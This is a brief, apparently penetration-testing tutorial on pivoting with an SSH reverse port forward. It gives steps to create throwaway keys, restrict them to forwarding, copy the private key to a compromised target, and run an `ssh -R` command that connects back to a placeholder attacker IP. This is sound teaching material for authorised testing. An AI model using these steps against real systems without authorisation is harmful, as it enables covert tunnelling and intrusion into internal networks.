Reverse connections require you to access your attacking machine *from* the target.

1. We must create a new set of SSH keys first with `ssh-keygen`. This will create a public and private key
2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.  
3. On a new line, type the following line, then paste in the public key:  
	`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
	This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

Next, check if SSH server on your attack machine is running:
`sudo systemctl status ssh`
If not, start the service with:
`sudo systemctl start ssh`

Next transfer the private keys to the target box. Usually a no-no but we generated a throwaway set of SSH keys to be discarded after engaging.

With the key transferred, we can then connect back with a reverse port forward using the following command:  
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`

